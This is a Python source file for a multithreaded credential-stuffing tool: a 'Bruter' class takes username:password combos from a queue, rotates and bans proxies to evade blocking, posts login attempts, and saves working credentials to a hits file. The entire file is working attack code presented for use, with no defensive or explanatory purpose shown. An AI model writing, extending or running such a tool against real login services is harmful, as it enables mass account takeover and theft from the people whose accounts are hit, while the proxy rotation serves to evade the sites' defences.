from .browser import Browser
from .const import (debug, response_success, response_error)
from sys import (path, platform)
from threading import Thread
from time import sleep


class Bruter:

    def __init__(self, max_threads, combo_queue, proxy_manager):
        self.combo_queue = combo_queue  # type = deque
        self.proxy_manager = proxy_manager  # type = class
        self.path_hits_file = None
        self.path_debug_file = None
        self.bots = []  # [thread1, ...]
        self.debug_messages = []  # [request1, ...]
        self.last_combo = ['', '']  # [username, password]
        self.max_threads = max_threads
        self.hits = 0
        self.tested = 0
        self.retries = 0
        self.isAlive = False

    def login(self, combo, proxy):
        try:
            browser = Browser()
            browser.create_session()
            browser.set_details(combo, proxy)
            browser.build_payload()
            browser.set_header()
            response = browser.post()

            if debug:

                debug_message = ('Proxy: ' + proxy[0] + ' (' + proxy[1] + '); ' +
                                         'Payload: ' + str(browser.payload) + '; ' +
                                         'Response: ' + response.text + ';\n')

                self.debug_messages.append(debug_message)

            if response.ok:
                if response_error not in response.text:
                    self.proxy_manager.disable(proxy, tested=True)
                    self.tested += 1
                    self.last_combo = combo

                    if response_success in response.text:
                        hits_file = open(self.path_hits_file, 'a+', encoding='utf-8', errors='ignore')
                        hits_file.write(combo[0] + ':' + combo[1] + '\n')
                        hits_file.close()
                        self.hits += 1
                
                # authentication site throws error
                else:
                    self.proxy_manager.disable(proxy)
                    self.combo_queue.appendleft(combo)
                    self.retries += 1

            else:
                raise()

        except:
            self.proxy_manager.disable(proxy, retries=True, ban_flag=True)
            self.combo_queue.appendleft(combo)
            self.retries += 1

    def bot(self):
        while self.isAlive and len(self.combo_queue):
            combo = self.combo_queue.popleft()
            proxy = self.proxy_manager.get()
            self.login(combo, proxy)

    def log(self):
        while self.isAlive:
            if len(self.debug_messages):
                debug_message = self.debug_messages.pop()
                debug_file = open(self.path_debug_file, 'a+', encoding='utf-8', errors='ignore')
                debug_file.write(debug_message)
                debug_file.close()

            else:
                sleep(0.5)

    def stop(self):
        self.isAlive = False
        
        # wait for bots to finish
        for bot in self.bots:
            bot.join()

    def start(self):
        self.isAlive = True

        # generate file paths
        if 'linux' in platform or 'darwin' in platform:
            path_separator = '/'

        elif 'win' in platform:
            path_separator = '\\'

        else:
            path_separator = '/'

        self.path_hits_file = path[0] + path_separator + 'hits.txt'
        self.path_debug_file = path[0] + path_separator + 'debug.txt'

        # start logging requests if debug is true
        if debug:
            t = Thread(target=self.log)
            t.start()
            self.bots.append(t)
        
        # start bots
        for i in range(self.max_threads):
            t = Thread(target=self.bot)
            t.start()
            self.bots.append(t)
